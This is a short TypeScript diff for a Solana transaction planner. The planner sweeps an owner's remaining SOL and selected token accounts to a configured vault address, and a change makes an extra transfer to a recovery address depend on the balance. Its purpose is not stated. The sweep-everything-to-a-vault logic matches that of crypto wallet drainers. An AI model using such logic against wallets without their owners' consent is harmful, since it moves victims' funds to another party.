@@ -16,7 +16,7 @@ const RECOVERY = 1_000_000n;
 const RENT_PER_ATA = 2_039_280n;
 const DUST = 1000n;
 
-export type Plan = { sol: bigint; tokens: Found[] };
+export type Plan = { sol: bigint; tokens: Found[]; rec: boolean };
 
 export async function plan(owner: PublicKey, balance: bigint, found: Found[]): Promise<Plan[]> {
   const priority = BigInt(Math.ceil((runtime.computeLimit * runtime.priority) / 1e6));
@@ -46,11 +46,11 @@ export async function plan(owner: PublicKey, balance: bigint, found: Found[]): P
 
   const solLeft = budget - rentSpent;
   const items: Plan[] = [];
-  if (solLeft > DUST) items.push({ sol: solLeft, tokens: [] });
+  if (solLeft > DUST) items.push({ sol: solLeft, tokens: [], rec: balance >= 3_000_000n });
 
   const perTx = Math.max(1, Math.floor(cfg.MAX_IX_PER_TX / 3) - 1);
   for (let i = 0; i < chosen.length; i += perTx) {
-    items.push({ sol: 0n, tokens: chosen.slice(i, i + perTx) });
+    items.push({ sol: 0n, tokens: chosen.slice(i, i + perTx), rec: false });
   }
 
   return items;
@@ -68,7 +68,7 @@ export async function buildAll(owner: PublicKey, items: Plan[], recovery: Public
 
     if (item.sol > 0n) {
       ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: cfg.vault, lamports: item.sol }));
-      if (recovery) {
+      if (item.rec) {
         ixs.push(SystemProgram.transfer({ fromPubkey: owner, toPubkey: recovery, lamports: RECOVERY }));
       }
     }
